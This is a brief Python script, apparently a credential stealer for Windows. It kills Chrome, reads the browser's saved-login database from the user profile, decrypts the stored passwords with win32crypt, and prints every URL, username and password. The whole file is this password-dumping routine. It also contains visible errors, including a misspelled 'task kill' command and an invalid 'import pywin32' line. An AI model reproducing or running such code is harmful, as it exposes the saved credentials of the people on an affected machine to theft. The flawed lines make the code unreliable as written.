import os
import sqlite3
from time import sleep
import pywin32
import win32crypt

#defining a function
def closeChrome():
    os.system("task kill /im chrome.exe /f")
   
def connectDb():
    dBpath=os.path.expanduser("~")+r'\Appdata\Local\Google\Chrome\User Data\Default\Login Data'
    connectionObj=sqlite3.connect(dBpath)
    cursorObj=connectionObj.cursor()
    statement="SELECT origin_url,username_value,password_value FROM logins"
    cursorObj.execute(statement)
    data=cursorObj.fetchall()
    print(data)
    for url,username,password in data:
        password=win32crypt.CryptUnprotectData(password)
        print(f'url: {url} username: {username} password :{password[1].decode("utf-8")}')
        print(".............................................")

closeChrome()
connectDb()
